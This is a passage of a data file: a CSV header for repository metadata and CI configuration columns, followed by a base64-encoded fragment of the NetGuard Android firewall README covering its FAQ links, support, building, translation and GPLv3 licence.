name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
US5tZCN1c2VyLWNvbnRlbnQtZmFxOCkKCjxhIG5hbWU9IkZBUTkiPjwvYT4K
WyoqKDkpIFdoeSBpcyB0aGUgVlBOIHNlcnZpY2UgYmVpbmcgcmVzdGFydGVk
PyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21h
c3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTkpCgo8YSBuYW1lPSJGQVEx
MCI+PC9hPgpbKiooMTApIFdpbGwgeW91IHByb3ZpZGUgYSBUYXNrZXIgcGx1
Zy1pbj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxv
Yi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXExMCkKCjxhIG5hbWU9
IkZBUTEzIj48L2E+ClsqKigxMykgSG93IGNhbiBJIHJlbW92ZSB0aGUgb25n
b2luZyBOZXRHdWFyZCBlbnRyeSBpbiB0aGUgbm90aWZpY2F0aW9uIHNjcmVl
bj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXExMykKCjxhIG5hbWU9IkZB
UTE0Ij48L2E+ClsqKigxNCkgV2h5IGNhbid0IEkgc2VsZWN0IE9LIHRvIGFw
cHJvdmUgdGhlIFZQTiBjb25uZWN0aW9uIHJlcXVlc3Q/KipdKGh0dHBzOi8v
Z2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1
c2VyLWNvbnRlbnQtZmFxMTQpCgo8YSBuYW1lPSJGQVExNSI+PC9hPgpbKioo
MTUpIEFyZSBGLURyb2lkIGJ1aWxkcyBzdXBwb3J0ZWQ/KipdKGh0dHBzOi8v
Z2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1
c2VyLWNvbnRlbnQtZmFxMTUpCgo8YSBuYW1lPSJGQVExNiI+PC9hPgpbKioo
MTYpIFdoeSBhcmUgc29tZSBhcHBsaWNhdGlvbnMgc2hvd24gZGltbWVkPyoq
XShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rl
ci9GQVEubWQjdXNlci1jb250ZW50LWZhcTE2KQoKPGEgbmFtZT0iRkFRMTci
PjwvYT4KWyoqKDE3KSBXaHkgaXMgTmV0R3VhcmQgdXNpbmcgc28gbXVjaCBt
ZW1vcnk/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Js
b2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMTcpCgo8YSBuYW1l
PSJGQVExOCI+PC9hPgpbKiooMTgpIFdoeSBjYW4ndCBJIGZpbmQgTmV0R3Vh
cmQgaW4gdGhlIEdvb2dsZSBQbGF54oSiIHN0b3JlIGFwcD8qKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXExOCkKCjxhIG5hbWU9IkZBUTE5Ij48L2E+Clsq
KigxOSkgV2h5IGRvZXMgYXBwbGljYXRpb24gWFlaIHN0aWxsIGhhdmUgaW50
ZXJuZXQgYWNjZXNzPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTE5KQoK
PGEgbmFtZT0iRkFRMjAiPjwvYT4KWyoqKDIwKSBDYW4gSSBHcmVlbmlmeS9o
aWJlcm5hdGUgTmV0R3VhcmQ/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
MjApCgo8YSBuYW1lPSJGQVEyMSI+PC9hPgpbKiooMjEpIERvZXMgZG96ZSBt
b2RlIGFmZmVjdCBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXEyMSkKCjxhIG5hbWU9IkZBUTIyIj48L2E+ClsqKigyMikgQ2FuIEkgdGV0
aGVyICh1c2UgdGhlIEFuZHJvaWQgaG90c3BvdCkgLyB1c2UgV2ktRmkgY2Fs
bGluZyB3aGlsZSB1c2luZyBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXEyMikKCjxhIG5hbWU9IkZBUTI0Ij48L2E+ClsqKigyNCkgQ2Fu
IHlvdSByZW1vdmUgdGhlIG5vdGlmaWNhdGlvbiBmcm9tIHRoZSBzdGF0dXMg
YmFyPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9i
L21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTI0KQoKPGEgbmFtZT0i
RkFRMjUiPjwvYT4KWyoqKDI1KSBDYW4geW91IGFkZCBhICdzZWxlY3QgYWxs
Jz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyNSkKCjxhIG5hbWU9IkZB
UTI3Ij48L2E+ClsqKigyNykgSG93IGRvIEkgcmVhZCB0aGUgYmxvY2tlZCB0
cmFmZmljIGxvZz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3Vh
cmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyNykKCjxh
IG5hbWU9IkZBUTI4Ij48L2E+ClsqKigyOCkgV2h5IGlzIEdvb2dsZSBjb25u
ZWN0aXZpdHkgc2VydmljZXMgYWxsb3dlZCBpbnRlcm5ldCBhY2Nlc3MgYnkg
ZGVmYXVsdD8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQv
YmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyOCkKCjxhIG5h
bWU9IkZBUTI5Ij48L2E+ClsqKigyOSkgV2h5IGRvIEkgZ2V0ICdUaGUgaXRl
bSB5b3UgcmVxdWVzdGVkIGlzIG5vdCBhdmFpbGFibGUgZm9yIHB1cmNoYXNl
Jz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyOSkKCjxhIG5hbWU9IkZB
UTMwIj48L2E+ClsqKigzMCkgQ2FuIEkgYWxzbyBydW4gQUZXYWxsKyBvbiB0
aGUgc2FtZSBkZXZpY2U/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05l
dEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzAp
Cgo8YSBuYW1lPSJGQVEzMSI+PC9hPgpbKiooMzEpIFdoeSBjYW4gc29tZSBh
cHBsaWNhdGlvbnMgYmUgY29uZmlndXJlZCBhcyBhIGdyb3VwIG9ubHk/Kipd
KGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVy
L0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzEpCgo8YSBuYW1lPSJGQVEzMiI+
PC9hPgpbKiooMzIpIFdoeSBpcyB0aGUgYmF0dGVyeS9uZXR3b3JrIHVzYWdl
IG9mIE5ldEd1YXJkIHNvIGhpZ2gqKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXEzMikKCjxhIG5hbWU9IkZBUTMzIj48L2E+ClsqKigzMykgQ2FuIHlvdSBh
ZGQgcHJvZmlsZXM/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1
YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzMpCgo8
YSBuYW1lPSJGQVEzNCI+PC9hPgpbKiooMzQpIENhbiB5b3UgYWRkIHRoZSBj
b25kaXRpb24gJ3doZW4gb24gZm9yZWdyb3VuZCc/KipdKGh0dHBzOi8vZ2l0
aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2Vy
LWNvbnRlbnQtZmFxMzQpCgo8YSBuYW1lPSJGQVEzNSI+PC9hPgpbKiooMzUp
IFdoeSBkb2VzIHRoZSBWUE4gbm90IHN0YXJ0PyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTM1KQoKPGEgbmFtZT0iRkFRMzYiPjwvYT4KWyoqKDM2KSBD
YW4geW91IGFkZCBQSU4gb3IgcGFzc3dvcmQgcHJvdGVjdGlvbj8qKl0oaHR0
cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFR
Lm1kI3VzZXItY29udGVudC1mYXEzNikKCjxhIG5hbWU9IkZBUTM3Ij48L2E+
ClsqKigzNykgV2h5IGFyZSB0aGUgcHJvIGZlYXR1cmVzIHNvIGV4cGVuc2l2
ZT8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEzNykKCjxhIG5hbWU9IkZB
UTM4Ij48L2E+ClsqKigzOCkgV2h5IGRpZCBOZXRHdWFyZCBzdG9wIHJ1bm5p
bmc/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2Iv
bWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzgpCgo8YSBuYW1lPSJG
QVEzOSI+PC9hPgpbKiooMzkpIEhvdyBkb2VzIGEgVlBOIGJhc2VkIGZpcmV3
YWxsIGRpZmZlciBmcm9tIGEgaXB0YWJsZXMgYmFzZWQgZmlyZXdhbGw/Kipd
KGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVy
L0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzkpCgo8YSBuYW1lPSJGQVE0MCI+
PC9hPgpbKiooNDApIENhbiB5b3UgYWRkIHNjaGVkdWxlcz8qKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXE0MCkKCjxhIG5hbWU9IkZBUTQxIj48L2E+Clsq
Kig0MSkgQ2FuIHlvdSBhZGQgd2lsZGNhcmRzPyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTQxKQoKPGEgbmFtZT0iRkFRNDIiPjwvYT4KWyoqKDQyKSBX
aHkgaXMgcGVybWlzc2lvbiAuLi4gbmVlZGVkPyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTQyKQoKPGEgbmFtZT0iRkFRNDMiPjwvYT4KWyoqKDQzKSBJ
IGdldCAnVGhpcyBhcHAgaXMgY2F1c2luZyB5b3VyIGRldmljZSB0byBydW4g
c2xvd2x5JyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9i
bG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQzKQoKPGEgbmFt
ZT0iRkFRNDQiPjwvYT4KWyoqKDQ0KSBJIGRvbid0IGdldCBub3RpZmljYXRp
b25zIG9uIGFjY2VzcyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ0KQoK
PGEgbmFtZT0iRkFRNDUiPjwvYT4KWyoqKDQ1KSBEb2VzIE5ldEd1YXJkIGhh
bmRsZSBpbmNvbWluZyBjb25uZWN0aW9ucz8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXE0NSkKCjxhIG5hbWU9IkZBUTQ2Ij48L2E+ClsqKig0NikgQ2Fu
IEkgZ2V0IGEgcmVmdW5kPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9O
ZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ2
KQoKPGEgbmFtZT0iRkFRNDciPjwvYT4KWyoqKDQ3KSBXaHkgYXJlIHRoZXJl
IGluIGFwcGxpY2F0aW9uIGFkdmVydGlzZW1lbnRzPyoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTQ3KQoKPGEgbmFtZT0iRkFRNDgiPjwvYT4KWyoqKDQ4
KSBXaHkgYXJlIHNvbWUgZG9tYWluIG5hbWVzIGJsb2NrZWQgd2hpbGUgdGhl
eSBhcmUgc2V0IHRvIGJlIGFsbG93ZWQ/KipdKGh0dHBzOi8vZ2l0aHViLmNv
bS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRl
bnQtZmFxNDgpCgo8YSBuYW1lPSJGQVE0OSI+PC9hPgpbKiooNDkpIERvZXMg
TmV0R3VhcmQgZW5jcnlwdCBteSBpbnRlcm5ldCB0cmFmZmljIC8gaGlkZSBt
eSBJUCBhZGRyZXNzPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ5KQoK
PGEgbmFtZT0iRkFRNTAiPjwvYT4KWyoqKDUwKSBXaWxsIE5ldEd1YXJkIGF1
dG9tYXRpY2FsbHkgc3RhcnQgb24gYm9vdD8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXE1MCkKCjxhIG5hbWU9IkZBUTUxIj48L2E+ClsqKig1MSkgTmV0
R3VhcmQgYmxvY2tzIGFsbCBpbnRlcm5ldCB0cmFmZmljISoqXShodHRwczov
L2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQj
dXNlci1jb250ZW50LWZhcTUxKQoKPGEgbmFtZT0iRkFRNTIiPjwvYT4KWyoq
KDUyKSBXaGF0IGlzIGxvY2tkb3duIG1vZGU/KipdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNv
bnRlbnQtZmFxNTIpCgo8YSBuYW1lPSJGQVE1MyI+PC9hPgpbKiooNTMpIFRo
ZSB0cmFuc2xhdGlvbiBpbiBteSBsYW5ndWFnZSBpcyBtaXNzaW5nIC8gaW5j
b3JyZWN0IC8gaW5jb21wbGV0ZSEqKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXE1MykKCjxhIG5hbWU9IkZBUTU0Ij48L2E+ClsqKig1NCkgSG93IHRvIHR1
bm5lbCBhbGwgVENQIGNvbm5lY3Rpb25zIHRocm91Z2ggdGhlIFRvciBuZXR3
b3JrPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9i
L21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTU0KQoKPGEgbmFtZT0i
RkFRNTUiPjwvYT4KWyoqKDU1KSBXaHkgZG9lcyBOZXRHdWFyZCBjb25uZWN0
IHRvIEFtYXpvbiAvIGlwaW5mby5pbz8qKl0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVu
dC1mYXE1NSkKCjxhIG5hbWU9IkZBUTU2Ij48L2E+ClsqKig1NikgTmV0R3Vh
cmQgYWxsb3dzIGFsbCBpbnRlcm5ldCB0cmFmZmljISoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTU2KQoKPGEgbmFtZT0iRkFRNTciPjwvYT4KWyoqKDU3
KSBXaHkgZG9lcyBOZXRHdWFyZCB1c2Ugc28gbXVjaCBkYXRhPyoqXShodHRw
czovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEu
bWQjdXNlci1jb250ZW50LWZhcTU3KQoKPGEgbmFtZT0iRkFRNTgiPjwvYT4K
WyoqKDU4KSBXaHkgZG9lcyBsb2FkaW5nIHRoZSBhcHBsaWNhdGlvbiBsaXN0
IHRha2UgYSBsb25nIHRpbWU/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
NTgpCgo8YSBuYW1lPSJGQVE1OSI+PC9hPgpbKiooNTkpIENhbiB5b3UgaGVs
cCBtZSByZXN0b3JlIG15IHB1cmNoYXNlPyoqXShodHRwczovL2dpdGh1Yi5j
b20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250
ZW50LWZhcTU5KQoKPGEgbmFtZT0iRkFRNjAiPjwvYT4KWyoqKDYwKSBXaHkg
ZG9lcyBJUCAoV2ktRmkpIGNhbGxpbmcvU01TL01NUyBub3Qgd29yaz8qKl0o
aHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIv
RkFRLm1kI3VzZXItY29udGVudC1mYXE2MCkKCjxhIG5hbWU9IkZBUTYxIj48
L2E+ClsqKig2MSkgSGVscCwgTmV0R3VhcmQgY3Jhc2hlZCEqKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXE2MSkKCjxhIG5hbWU9IkZBUTYyIj48L2E+Clsq
Kig2MikgSG93IGNhbiBJIHNvbHZlICdUaGVyZSB3YXMgYSBwcm9ibGVtIHBh
cnNpbmcgdGhlIHBhY2thZ2UnID8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXE2MikKCjxhIG5hbWU9IkZBUTYzIj48L2E+ClsqKig2MykgV2h5IGlzIGFs
bCBETlMgdHJhZmZpYyBhbGxvd2VkPyoqXShodHRwczovL2dpdGh1Yi5jb20v
TTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50
LWZhcTYzKQoKPGEgbmFtZT0iRkFRNjQiPjwvYT4KWyoqKDY0KSBDYW4geW91
IGFkZCBETlMgb3ZlciBUTFM/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
NjQpCgo8YSBuYW1lPSJGQVE2NSI+PC9hPgpbKiooNjUpIFdoeSBjYW4gTmV0
R3VhcmQgbm90IGJsb2NrIGl0c2VsZj8qKl0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVu
dC1mYXE2NSkKClN1cHBvcnQKLS0tLS0tLQoKRm9yIHF1ZXN0aW9ucywgZmVh
dHVyZSByZXF1ZXN0cyBhbmQgYnVnIHJlcG9ydHMsIHBsZWFzZSBbdXNlIHRo
aXMgWERBLURldmVsb3BlcnMgZm9ydW0gdGhyZWFkXShodHRwOi8vZm9ydW0u
eGRhLWRldmVsb3BlcnMuY29tL3Nob3d0aHJlYWQucGhwP3Q9MzIzMzAxMiku
CgpUaGVyZSBpcyBzdXBwb3J0IG9uIHRoZSBsYXRlc3QgdmVyc2lvbiBvZiBO
ZXRHdWFyZCBvbmx5LgoKVGhlcmUgaXMgbm8gc3VwcG9ydCBvbiB0aGluZ3Mg
dGhhdCBhcmUgbm90IGRpcmVjdGx5IHJlbGF0ZWQgdG8gTmV0R3VhcmQuCgpU
aGVyZSBpcyBubyBzdXBwb3J0IG9uIGJ1aWxkaW5nIGFuZCBkZXZlbG9waW5n
IHRoaW5ncyBieSB5b3Vyc2VsZi4KCioqTmV0R3VhcmQgaXMgc3VwcG9ydGVk
IGZvciBwaG9uZXMgYW5kIHRhYmxldHMgb25seSwgc28gbm90IGZvciBvdGhl
ciBkZXZpY2UgdHlwZXMgbGlrZSBvbiBhIHRlbGV2aXNpb24gb3IgaW4gYSBj
YXIuKioKCkNvbnRyaWJ1dGluZwotLS0tLS0tLS0tLS0KCipCdWlsZGluZyoK
CkJ1aWxkaW5nIGlzIHNpbXBsZSwgaWYgeW91IGluc3RhbGwgdGhlIHJpZ2h0
IHRvb2xzOgoKKiBbQW5kcm9pZCBTdHVkaW9dKGh0dHA6Ly9kZXZlbG9wZXIu
YW5kcm9pZC5jb20vc2RrLykKKiBbQW5kcm9pZCBOREtdKGh0dHA6Ly9kZXZl
bG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvc2RrL25kay8pCgpUaGUgbmF0aXZl
IGNvZGUgaXMgYnVpbHQgYXMgcGFydCBvZiB0aGUgQW5kcm9pZCBTdHVkaW8g
cHJvamVjdC4KCkl0IGlzIGV4cGVjdGVkIHRoYXQgeW91IGNhbiBzb2x2ZSBi
dWlsZCBwcm9ibGVtcyB5b3Vyc2VsZiwgc28gdGhlcmUgaXMgbm8gc3VwcG9y
dCBvbiBidWlsZGluZy4KSWYgeW91IGNhbm5vdCBidWlsZCB5b3Vyc2VsZiwg
dGhlcmUgYXJlIHByZWJ1aWx0IHZlcnNpb25zIG9mIE5ldEd1YXJkIGF2YWls
YWJsZSBbaGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQv
cmVsZWFzZXMpLgoKKlRyYW5zbGF0aW5nKgoKKiBUcmFuc2xhdGlvbnMgdG8g
b3RoZXIgbGFuZ3VhZ2VzIGFyZSB3ZWxjb21lZAoqIFlvdSBjYW4gdHJhbnNs
YXRlIG9ubGluZSBbaGVyZV0oaHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0
L25ldGd1YXJkLykKKiBJZiB5b3VyIGxhbmd1YWdlIGlzIG5vdCBsaXN0ZWQs
IHBsZWFzZSBzZW5kIGEgbWVzc2FnZSB0byBtYXJjZWwocGx1cyluZXRndWFy
ZChhdClmYWlyY29kZShkb3QpZXUKKiBZb3UgY2FuIHNlZSB0aGUgc3RhdHVz
IG9mIGFsbCB0cmFuc2xhdGlvbnMgW2hlcmVdKGh0dHBzOi8vY3Jvd2Rpbi5j
b20vcHJvamVjdC9uZXRndWFyZCkuCgpQbGVhc2Ugbm90ZSB0aGF0IGJ5IGNv
bnRyaWJ1dGluZyB5b3UgYWdyZWUgdG8gdGhlIGxpY2Vuc2UgYmVsb3csIGlu
Y2x1ZGluZyB0aGUgY29weXJpZ2h0LCB3aXRob3V0IGFueSBhZGRpdGlvbmFs
IHRlcm1zIG9yIGNvbmRpdGlvbnMuCgpBdHRyaWJ1dGlvbgotLS0tLS0tLS0t
LQoKTmV0R3VhcmQgdXNlczoKCiogW0dsaWRlXShodHRwczovL2J1bXB0ZWNo
LmdpdGh1Yi5pby9nbGlkZS8pCiogW0FuZHJvaWQgU3VwcG9ydCBMaWJyYXJ5
XShodHRwczovL2RldmVsb3Blci5hbmRyb2lkLmNvbS90b29scy9zdXBwb3J0
LWxpYnJhcnkvKQoKTGljZW5zZQotLS0tLS0tCgpbR05VIEdlbmVyYWwgUHVi
bGljIExpY2Vuc2UgdmVyc2lvbiAzXShodHRwOi8vd3d3LmdudS5vcmcvbGlj
ZW5zZXMvZ3BsLnR4dCkKCkNvcHlyaWdodCAoYykgMjAxNS0yMDE4IE1hcmNl
bCBCb2tob3JzdCAoW002NkJdKGh0dHBzOi8vY29udGFjdC5mYWlyY29kZS5l
dS8pKQoKQWxsIHJpZ2h0cyByZXNlcnZlZAoKVGhpcyBmaWxlIGlzIHBhcnQg
b2YgTmV0R3VhcmQuCgpOZXRHdWFyZCBpcyBmcmVlIHNvZnR3YXJlOiB5b3Ug
Y2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5Cml0IHVuZGVyIHRo
ZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMg
cHVibGlzaGVkIGJ5CnRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVp
dGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yCihhdCB5b3VyIGRp
c2NyZXRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKTmV0R3VhcmQgaXMgZGlz
dHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwK
YnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGlt
cGxpZWQgd2FycmFudHkgb2YKTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1Mg
Rk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQpHTlUgR2VuZXJh
bCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgoKWW91IHNob3Vs
ZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVi
